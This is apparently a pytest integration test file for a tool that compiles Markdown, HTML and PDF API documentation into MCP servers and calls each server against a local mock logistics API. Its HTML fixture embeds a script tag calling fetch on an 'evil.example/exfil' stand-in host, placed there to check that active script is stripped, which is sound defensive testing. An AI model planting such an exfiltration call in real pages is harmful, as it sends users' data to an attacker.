"""Phase P3 Integration Tests: End-to-End Prose-to-Server Vertical Slice across Markdown, HTML, and PDF (T18)."""

from __future__ import annotations

import json
import os
import sys
import threading
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, unquote, urlparse

import pytest
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

from packages.core.pipeline import RawDocumentInput, compile_documentation_bundle
from packages.core.planning import RuntimePolicy
from tests.unit.test_p3_parsers_inference_and_reconciliation import (
    build_synthetic_pdf_bytes,
)


class LogisticsMockOracle:
    """Independent HTTP mock oracle for Phase P3 Markdown, HTML, and PDF vertical slice tests."""

    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        self._server: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self.base_url: str = ""

    def start(self) -> str:
        oracle = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
                pass

            def _record(self) -> dict[str, Any]:
                length = int(self.headers.get("Content-Length", "0"))
                raw_body = self.rfile.read(length) if length > 0 else b""
                parsed = urlparse(self.path)
                req = {
                    "method": self.command,
                    "path": parsed.path,
                    "query": parse_qs(parsed.query, keep_blank_values=True),
                    "headers": {k.lower(): v for k, v in self.headers.items()},
                    "body": raw_body,
                }
                oracle.requests.append(req)
                return req

            def _send_json(self, status: int, payload: dict[str, Any]) -> None:
                data = json.dumps(payload, sort_keys=True).encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self) -> None:
                req = self._record()
                if req["headers"].get("authorization") != "Bearer logistics-test-token":
                    self._send_json(401, {"error": "unauthorized"})
                    return

                if req["path"].startswith("/v1/shipments/"):
                    ship_id = unquote(req["path"][len("/v1/shipments/") :])
                    inc = req["query"].get("include_checkpoints", ["false"])[0]
                    self._send_json(
                        200,
                        {
                            "shipment_id": ship_id,
                            "status": "in_transit",
                            "include_checkpoints": inc,
                            "format_verified": "markdown",
                        },
                    )
                    return

                if req["path"].startswith("/v1/invoices/"):
                    inv_id = unquote(req["path"][len("/v1/invoices/") :])
                    currency = req["query"].get("currency", ["USD"])[0]
                    self._send_json(
                        200,
                        {
                            "invoice_id": inv_id,
                            "currency": currency,
                            "format_verified": "html",
                        },
                    )
                    return

                if req["path"].startswith("/v1/warehouses/"):
                    wh_id = unquote(req["path"][len("/v1/warehouses/") :])
                    inc_zones = req["query"].get("include_zones", ["false"])[0]
                    self._send_json(
                        200,
                        {
                            "warehouse_id": wh_id,
                            "include_zones": inc_zones,
                            "format_verified": "pdf",
                        },
                    )
                    return

                self._send_json(404, {"error": "not_found"})

        self._server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        host, port = self._server.server_address
        self.base_url = f"http://{host}:{port}"
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        return self.base_url

    def stop(self) -> None:
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
        if self._thread is not None:
            self._thread.join(timeout=3.0)


@pytest.fixture()
def logistics_oracle():
    oracle = LogisticsMockOracle()
    oracle.start()
    yield oracle
    oracle.stop()


async def _invoke_exported_zip_tool(
    zip_path: Path,
    unpacked_dir: Path,
    package_slug: str,
    tool_name: str,
    arguments: dict[str, Any],
) -> dict[str, Any]:
    unpacked_dir.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(unpacked_dir)

    env = os.environ.copy()
    env["PYTHONPATH"] = str(unpacked_dir)
    env["PYTHONUTF8"] = "1"
    env["SPIGOT_CRED_BEARER_AUTH"] = "logistics-test-token"

    server_params = StdioServerParameters(
        command=sys.executable,
        args=["-m", f"{package_slug}.server"],
        cwd=str(unpacked_dir),
        env=env,
    )
    async with stdio_client(server_params) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            tools_res = await session.list_tools()
            assert any(t.name == tool_name for t in tools_res.tools)
            call_res = await session.call_tool(tool_name, arguments)
            assert call_res.is_error is False
            return json.loads(call_res.content[0].text)


@pytest.mark.anyio
async def test_t18_markdown_html_and_pdf_prose_to_server_vertical_slice(
    logistics_oracle: LogisticsMockOracle,
    tmp_path: Path,
) -> None:
    """T18 Gate: Markdown, Saved HTML, and Multi-Page Text PDF each compile to a working MCP server."""
    base_url = logistics_oracle.base_url
    policy = RuntimePolicy(id="pol-p3-ro", mode="read_only")

    # 1. Markdown multi-file bundle -> Generated MCP Server -> Mock Oracle call
    md_auth = (
        f"# Logistics API Overview\n"
        f"Base URL: {base_url}\n"
        f"Authentication: Send `Authorization: Bearer <token>` on all requests.\n"
    ).encode()
    md_endpoints = (
        b"# Shipments Endpoints\n"
        b"### GET /v1/shipments/{shipment_id}\n"
        b"Retrieves live shipment status.\n"
        b"| Parameter | Location | Type | Required | Description |\n"
        b"| --- | --- | --- | --- | --- |\n"
        b"| shipment_id | path | string | yes | Shipment ID |\n"
        b"| include_checkpoints | query | boolean | no | Include checkpoints |\n"
    )

    md_out = tmp_path / "md_build"
    md_zip = tmp_path / "md_server.zip"
    md_res = compile_documentation_bundle(
        [
            RawDocumentInput("src_md_auth", "auth.md", md_auth),
            RawDocumentInput("src_md_ep", "shipments.md", md_endpoints),
        ],
        contract_id="logistics-md-contract",
        project_id="proj-logistics-md",
        policy=policy,
        use_local_model=False,
        output_dir=md_out,
        zip_path=md_zip,
        package_slug="logistics_md_srv",
    )
    assert md_res.manifest is not None
    md_call = await _invoke_exported_zip_tool(
        md_zip,
        tmp_path / "md_unpacked",
        "logistics_md_srv",
        "get_v1_shipments_shipment_id",
        {"shipment_id": "SHP-500", "include_checkpoints": True},
    )
    assert md_call["status_code"] == 200
    assert md_call["data"]["shipment_id"] == "SHP-500"
    assert md_call["data"]["include_checkpoints"] == "true"
    assert md_call["data"]["format_verified"] == "markdown"

    # 2. Saved HTML manual (with active script stripped) -> Generated MCP Server -> Mock Oracle call
    html_doc = f"""<!DOCTYPE html>
    <html>
    <head><script>fetch("https://evil.example/exfil");</script></head>
    <body>
      <h1>Billing Portal Documentation</h1>
      <p>Base URL: {base_url}</p>
      <p>Authentication: Bearer token in Authorization header.</p>
      <h2>GET /v1/invoices/{{invoice_id}}</h2>
      <p>Fetches an invoice record.</p>
      <table>
        <tr><th>Name</th><th>Location</th><th>Type</th><th>Required</th><th>Description</th></tr>
        <tr><td>invoice_id</td><td>path</td><td>string</td><td>yes</td><td>Invoice ID</td></tr>
        <tr><td>currency</td><td>query</td><td>string</td><td>no</td><td>ISO Currency</td></tr>
      </table>
    </body>
    </html>
    """.encode()

    html_out = tmp_path / "html_build"
    html_zip = tmp_path / "html_server.zip"
    html_res = compile_documentation_bundle(
        [RawDocumentInput("src_html_inv", "invoices.html", html_doc)],
        contract_id="logistics-html-contract",
        project_id="proj-logistics-html",
        policy=policy,
        use_local_model=False,
        output_dir=html_out,
        zip_path=html_zip,
        package_slug="logistics_html_srv",
    )
    assert html_res.manifest is not None
    html_call = await _invoke_exported_zip_tool(
        html_zip,
        tmp_path / "html_unpacked",
        "logistics_html_srv",
        "get_v1_invoices_invoice_id",
        {"invoice_id": "INV-2026-09", "currency": "EUR"},
    )
    assert html_call["status_code"] == 200
    assert html_call["data"]["invoice_id"] == "INV-2026-09"
    assert html_call["data"]["currency"] == "EUR"
    assert html_call["data"]["format_verified"] == "html"

    # 3. Multi-page Text PDF manual -> Generated MCP Server -> Mock Oracle call
    pdf_bytes = build_synthetic_pdf_bytes(
        [
            [
                "# Warehouse Capacity Manual",
                f"Base URL: {base_url}",
                "Authentication: Send Authorization: Bearer token header.",
                "### GET /v1/warehouses/{warehouse_id}",
                "Returns warehouse capacity and zone breakdown.",
            ],
            [
                "| Name | Location | Type | Required | Description |",
                "| warehouse_id | path | string | yes | Warehouse code |",
                "| include_zones | query | boolean | no | Include zone details |",
            ],
        ]
    )

    pdf_out = tmp_path / "pdf_build"
    pdf_zip = tmp_path / "pdf_server.zip"
    pdf_res = compile_documentation_bundle(
        [RawDocumentInput("src_pdf_wh", "warehouses.pdf", pdf_bytes)],
        contract_id="logistics-pdf-contract",
        project_id="proj-logistics-pdf",
        policy=policy,
        use_local_model=False,
        output_dir=pdf_out,
        zip_path=pdf_zip,
        package_slug="logistics_pdf_srv",
    )
    assert pdf_res.manifest is not None
    pdf_call = await _invoke_exported_zip_tool(
        pdf_zip,
        tmp_path / "pdf_unpacked",
        "logistics_pdf_srv",
        "get_v1_warehouses_warehouse_id",
        {"warehouse_id": "WH-WEST-01", "include_zones": True},
    )
    assert pdf_call["status_code"] == 200
    assert pdf_call["data"]["warehouse_id"] == "WH-WEST-01"
    assert pdf_call["data"]["include_zones"] == "true"
    assert pdf_call["data"]["format_verified"] == "pdf"
